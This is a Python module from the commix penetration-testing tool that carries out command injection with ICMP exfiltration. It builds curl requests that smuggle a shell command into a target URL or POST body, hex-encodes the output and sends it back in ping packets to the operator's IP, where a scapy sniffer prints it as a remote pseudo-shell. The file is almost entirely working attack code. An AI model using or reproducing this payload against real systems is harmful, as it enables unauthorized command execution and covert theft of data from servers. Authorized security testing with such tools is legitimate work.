#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import time
import signal
import socket
import threading

from src.utils import colors
from src.utils import settings

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

"""
  The ICMP Exfiltration technique.
  -------------------------------------
  [1] http://blog.ring-zer0.com/2014/02/data-exfiltration-on-linux.html
  [2] http://blog.curesec.com/article/blog/23.html
  --------------------------------------
"""

def packet_handler(Packet):
  if Packet.haslayer(ICMP):
    Data = Packet.getlayer(ICMP).getlayer(Raw)
    sys.stdout.write(Data.load[8:])
    sys.stdout.flush()
    
def signal_handler(signal, frame):
  sys.exit(0)

def snif(ip_dst,ip_src):
  print("(*) Starting the sniffer [" + colors.BOLD + colors.YELLOW + ip_src + colors.RESET + "] <--> [" + colors.BOLD + colors.YELLOW + ip_dst + colors.RESET + "]...")
  while True:
    sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
			  
def exploitation(ip_dst,ip_src,url,http_request_method,request_data):
  signal.signal(signal.SIGINT, signal_handler)
  sniffer_thread = threading.Thread(target=snif, args=(ip_dst,ip_src,)).start()
  time.sleep(1)
  while True :
    print ""
    print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
    while True:
      try:
	cmd = raw_input("Shell > ")
	if cmd == "q":
	  os._exit(0)
	  
	else:
	  if http_request_method == "GET":
	    payload = ('curl \"'+ url + 
		      '; for i in \$(' + cmd + 
		      ' | xxd -ps -c8); do ping ' + ip_src + 
		      ' -c1 -s16 -p \$i ; done\"' + 
		      ' -s >/dev/null 2>&1'
		      )
	    
	  else:
	    payload = ('curl ' + url  + ' --data \"'+ request_data +'' +
		      '; for i in \$(' + cmd + 
		      ' | xxd -ps -c8); do ping ' + ip_src + 
		      ' -c1 -s16 -p \$i ; done\"' +
		      ' -s >/dev/null 2>&1'
		      )
	    
	sys.stdout.write(colors.GREEN + colors.BOLD + "\n")
	os.system(payload) 
	time.sleep(1)
	sys.stdout.write("\n" + colors.RESET)
	
      except:
	print ""
	os._exit(0)
	
  sniffer_thread.join()

if __name__ == "__main__":
    main()
